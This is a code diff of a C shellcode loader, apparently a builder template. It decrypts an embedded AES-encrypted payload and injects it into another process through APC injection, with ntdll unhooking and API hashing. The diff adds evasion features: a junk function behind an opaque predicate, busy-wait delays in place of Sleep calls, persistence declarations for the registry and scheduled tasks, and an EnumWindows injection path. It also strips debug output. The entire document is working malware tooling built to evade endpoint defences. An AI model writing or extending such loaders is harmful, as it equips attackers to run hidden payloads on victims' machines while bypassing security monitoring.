@@ -4,6 +4,16 @@
 #include "whispers.h"
 #include "functions.h"
 #include "AES_128_CBC.h"
+#include "obfuscation.h"
+
+// Junk function
+void junk_function(void) {
+    volatile int x = 0;
+    for (int i = 0; i < 100; i++) x++;
+}
+
+void add_persistence_reg(void);
+void add_persistence_task(void);
 
 #define TARGET_PROCESS "#-TARGET_PROCESS-#"
 
@@ -16,6 +26,10 @@ unsigned char payload[] = {
 
 #ifdef USE_SPAWN
 BOOL SpawnAndInject(PVOID pPayload, SIZE_T sPayload);
+#endif
+
+#ifdef USE_ENUMWINDOWS
+BOOL EnumWindowsInjection(PBYTE pShellcode, SIZE_T sSize);
 #endif
 
 int main() {
@@ -33,85 +47,63 @@ int main() {
 
         NTSTATUS        STATUS                          = 0x00;
 
-
-        //printf("[+] Un-hooking Ntdll \n");
         LPVOID nt = MapNtdll();
-        if (!nt) 
-                return -1;
+        if (!nt) return -1;
+        if (!Unhook(nt)) return -1;
 
-        if (!Unhook(nt)) 
-                return -1;
+        if (OPAQUE_FALSE) junk_function(); // never executed
 
-        Sleep(500);
+        high_cpu_wait(500);
 
-        //printf("[+] PID: %d\n", GetCurrentProcessId());
-        //printf("[+] Got the content at position: 0x%p with size of %zu\n", &payload, sEncPayload);
-
-        // Decryption routine
-        //printf("[i] Starting the decryption...\n");
-
-        Sleep(500);
-        // Allocating memory to store the decrypted payload inside of pClearText
         pClearText = (PBYTE)malloc(sEncPayload);
         AES_DecryptInit(&ctx, aes_k, aes_i);
         AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload);
 
-        //printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);
+        high_cpu_wait(1500);
 
-        Sleep(1500);
-
-#ifdef USE_SPAWN
+//#-INJECTION-#   // replaced with #define USE_ENUMWINDOWS if selected
+#ifdef USE_ENUMWINDOWS
+        // --- ENUMWINDOWS INJECTION ---
+        if (!EnumWindowsInjection(pClearText, sEncPayload)) {
+                free(pClearText);
+                return -1;
+        }
+#elif defined(USE_SPAWN)
         // --- SPAWN INJECTION ---
         if (!SpawnAndInject(pClearText, sEncPayload)) {
-                //printf("[-] Spawn injection failed!\n");
                 free(pClearText);
                 return -1;
         }
-        //printf("[+] Spawn injection successful!\n");
 #else
         // --- ORIGINAL APC INJECTION ---
-        //printf("[i] Creating suspended process..\n");
-        // Creating a suspeneded process now
         if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
-
-                //printf("[-] Failed to create suspended process!\n");
                 free(pClearText);
                 return -1;
         }
-        //printf("[+] Process created with PID: %d\n", dwProcessId);
 
-        Sleep(2500);
-        //printf("[i] Injecting the shellcode into the process..\n");
-        // Doing the APC Injection
+        high_cpu_wait(2500);
+
         if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {
                 free(pClearText);
                 return -1;
         }
 
-        Sleep(1500);
-        //printf("[i] Running the shellcode via NtQueueApcThread..\n");
-        // Running the thread via QueueAPCThread
-        if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {
+        high_cpu_wait(1500);
 
-                //printf("[-] NtQueueApcThrad failed!\n");
+        if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {
                 free(pClearText);
                 return -1;
         }
 
-        // API Hashing
         cDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);
-
-        //printf("[i] Position of DAPsu: 0x%p\n", cDAPSu);
-
-        Sleep(1000);
-        // Stopping the debugging of the process, which launches the payload
+        high_cpu_wait(1000);
         cDAPSu(dwProcessId);
-        //printf("[+] Payload executed!\n");
 
         CloseHandle(hThread);
         CloseHandle(hProcess);
 #endif
 
+        // Injection completed
         free(pClearText);
         return 0;
 }
